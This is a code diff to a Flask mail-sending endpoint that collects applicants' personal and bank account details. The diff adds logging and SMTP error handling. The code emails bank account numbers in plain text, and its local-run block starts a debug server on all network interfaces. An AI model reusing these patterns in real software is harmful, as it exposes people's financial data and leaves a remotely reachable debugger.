@@ -6,10 +6,16 @@ from email.mime.multipart import MIMEMultipart
 import smtplib
 import re
 import os
+import logging
+import traceback
 
 # --- Flask App Definition for Vercel ---
 app = Flask(__name__)
 CORS(app)
+
+# Configure basic logging for debugging
+logging.basicConfig(level=logging.INFO)
+app.logger.setLevel(logging.INFO)
 
 # --- Securely load credentials from Vercel's Environment Variables ---
 SENDER_EMAIL = os.environ.get('SENDER_EMAIL')
@@ -30,7 +36,9 @@ def validate_form_data(data):
     errors = []
     required_fields = ['first-name', 'last-name', 'email', 'phone', 'address', 'city-state', 'zipcode', 'gender', 'age', 'bank-name', 'bank-number']
     for field in required_fields:
-        if not data.get(field) or not str(data.get(field)).strip():
+        # protect against None data
+        value = None if data is None else data.get(field)
+        if not value or not str(value).strip():
             errors.append(f"{field.replace('-', ' ').title()} is required.")
     if errors: return errors
     if not validate_email(data.get('email')): errors.append("Invalid email format.")
@@ -44,14 +52,23 @@ def send_mail_route():
     try:
         data = request.get_json()
     except Exception:
+        app.logger.error("Failed to parse JSON body:\n%s", traceback.format_exc())
         return jsonify({"status": "error", "message": "Invalid JSON format"}), 400
+
+    # If no JSON body was provided, tell the client
+    if data is None:
+        app.logger.info("No JSON body received in request to /sendmail")
+        return jsonify({"status": "error", "message": "No JSON body provided. Ensure Content-Type: application/json and that you send a JSON payload."}), 400
 
     validation_errors = validate_form_data(data)
     if validation_errors:
         return jsonify({"status": "error", "message": " | ".join(validation_errors)}), 400
 
     if not all([SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL]):
-        return jsonify({"status": "error", "message": "Server is not configured to send emails."}), 500
+        # Log which env vars are missing (but never log the password value)
+        app.logger.error("Email env vars missing. SENDER_EMAIL set: %s, RECEIVER_EMAIL set: %s, SENDER_PASSWORD set: %s",
+                         bool(SENDER_EMAIL), bool(RECEIVER_EMAIL), bool(SENDER_PASSWORD))
+        return jsonify({"status": "error", "message": "Server is not configured to send emails. Missing environment variables."}), 500
 
     try:
         subject = "New Application from Your Website"
@@ -78,13 +95,40 @@ Account Number: {data.get('bank-number', 'N/A')}"""
         msg['Subject'] = subject
         msg.attach(MIMEText(body, 'plain'))
 
-        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+        # Attempt to send email and provide clearer logs for common SMTP failures
+        with smtplib.SMTP('smtp.gmail.com', 587, timeout=30) as server:
+            server.set_debuglevel(0)
             server.starttls()
-            server.login(SENDER_EMAIL, SENDER_PASSWORD)
-            server.send_message(msg)
+            try:
+                server.login(SENDER_EMAIL, SENDER_PASSWORD)
+            except smtplib.SMTPAuthenticationError as auth_err:
+                app.logger.error("SMTP authentication failed: %s", auth_err)
+                app.logger.debug(traceback.format_exc())
+                return jsonify({"status": "error", "message": "SMTP authentication failed. Check SENDER_EMAIL and SENDER_PASSWORD (use an app password if using Gmail with 2FA)."}), 500
+            except Exception as e:
+                app.logger.error("Unexpected error during SMTP login: %s", e)
+                app.logger.debug(traceback.format_exc())
+                return jsonify({"status": "error", "message": "Failed to login to SMTP server."}), 500
+
+            try:
+                server.send_message(msg)
+            except Exception as send_err:
+                app.logger.error("Failed to send email: %s", send_err)
+                app.logger.debug(traceback.format_exc())
+                return jsonify({"status": "error", "message": "Failed to send email. See server logs for details."}), 500
 
         return jsonify({"status": "success", "message": "Form sent successfully!", "redirect": "/thank_you.html"}), 200
 
     except Exception as e:
-        print(f"---!!! PRODUCTION EMAIL SENDING FAILED: {e} !!!---")
-        return jsonify({"status": "error", "message": "An internal error occurred."}), 500
+        # Log full traceback to server logs for debugging; return a safe message to client
+        app.logger.error("---!!! PRODUCTION EMAIL SENDING FAILED: %s !!!---", e)
+        app.logger.debug(traceback.format_exc())
+        return jsonify({"status": "error", "message": "An internal error occurred. See server logs for details."}), 500
+
+
+# Helpful local-run guard for testing (ignored on platforms like Vercel)
+if __name__ == '__main__':
+    # For local testing: ensure logs are verbose
+    app.logger.setLevel(logging.DEBUG)
+    logging.getLogger('werkzeug').setLevel(logging.INFO)
+    app.run(host='0.0.0.0', port=5000, debug=True)
